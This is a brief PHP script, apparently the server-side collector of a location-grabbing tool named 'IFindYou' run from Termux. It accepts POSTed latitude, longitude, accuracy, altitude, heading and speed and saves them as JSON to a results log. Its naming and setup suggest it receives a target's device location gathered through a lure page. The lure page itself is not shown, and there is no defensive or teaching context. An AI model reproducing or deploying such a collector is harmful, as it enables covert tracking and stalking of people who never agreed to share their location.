<?php
$white  = "\033[37m";
$orange = "\033[33m";
$green  = "\033[32m";
$red    = "\033[31m";
$cyan   = "\033[36m";
$cln    = "\e[0m";
$bold   = "\e[1m";

header('Content-Type: text/html');
{
  $ok_status = $_POST['Status'];
  $lat = $_POST['Lat'];
  $lon = $_POST['Lon'];
  $acc = $_POST['Acc'];
  $alt = $_POST['Alt'];
  $dir = $_POST['Dir'];
  $spd = $_POST['Spd'];

  $data = array(
    'status' => $ok_status,
    'lat' => $lat,
    'lon' => $lon,
    'acc' => $acc,
    'alt' => $alt,
    'dir' => $dir,
    'spd' => $spd);

  $json_data = json_encode($data);

  $f = fopen('/data/data/com.termux/files/home/IFindYou/logs/result.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
}
?>
